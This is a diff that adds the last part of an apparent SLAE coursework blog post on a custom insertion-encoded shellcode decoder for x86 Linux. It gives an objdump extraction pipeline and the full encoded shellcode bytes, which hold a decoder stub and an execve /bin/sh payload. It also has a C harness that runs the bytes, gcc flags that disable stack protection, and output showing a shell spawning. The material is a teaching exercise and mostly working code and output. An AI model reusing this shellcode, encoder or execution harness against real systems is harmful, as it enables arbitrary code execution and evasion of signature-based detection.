@@ -104,3 +104,44 @@ The address of our encoded shellcode is first popped into ```esi``` using the ``
 The second byte is then stored in ```ebx```, and the instruction after that runs a check for whether we have reached the end. In that case, we jump and pass execution. Otherwise, we move the value of the next important byte in ```ebx```, which is at ```[esi + eax + 2]```. This is because we have two junk bytes. We move the important byte in place of the second byte, and we increment the counter that keeps track of the important bytes.
 
 We add 3 to the counter that keeps track of the closest byte next, and we continue this process until the end is reached.
+
+Alright! Let's extract this shellcode and test it out. Pay close attention to the ```objdump``` command though:
+```
+$ objdump -d ./decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xde\x74\x10\x8a\x5c\x06\x02\x88\x1f\x47\x04\x03\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc4\xc0\xaa\xa3\x50\xaa\x6d\x68\xaa\x6c\x2f\xaa\x66\x2f\xaa\xc7\x73\xaa\x74\x68\xaa\xc7\x68\xaa\x88\x2f\xaa\xd1\x62\xaa\x58\x69\xaa\x5e\x6e\xaa\x12\x89\xaa\x65\xe3\xaa\xaf\x50\xaa\xf5\x89\xaa\x9e\xe2\xaa\x25\x53\xaa\x79\x89\xaa\x69\xe1\xaa\x26\xb0\xaa\xd6\x0b\xaa\x60\xcd\xaa\x54\x80\xaa\xc2\xde"
+```
+
+```c
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xde\x74\x10\x8a\x5c\x06\x02\x88\x1f\x47\x04\x03\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc4\xc0\xaa\xa3\x50\xaa\x6d\x68\xaa\x6c\x2f\xaa\x66\x2f\xaa\xc7\x73\xaa\x74\x68\xaa\xc7\x68\xaa\x88\x2f\xaa\xd1\x62\xaa\x58\x69\xaa\x5e\x6e\xaa\x12\x89\xaa\x65\xe3\xaa\xaf\x50\xaa\xf5\x89\xaa\x9e\xe2\xaa\x25\x53\xaa\x79\x89\xaa\x69\xe1\xaa\x26\xb0\xaa\xd6\x0b\xaa\x60\xcd\xaa\x54\x80\xaa\xc2\xde";
+main()
+{
+
+        printf("Shellcode Length:  %d\n", strlen(code));
+
+        int (*ret)() = (int(*)())code;
+
+        ret();
+
+}
+```
+Let's compile and run this:
+```
+$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+shellcode.c:6:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
+    6 | main()
+      | ^~~~
+kali@kali ~/Desktop/SLAE_Practice/SLAEx86_Assignments/assignment4 $ ./shellcode
+Shellcode Length:  112
+$
+```
+And our shell executes!
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+
+Student ID: SLAE - 1534
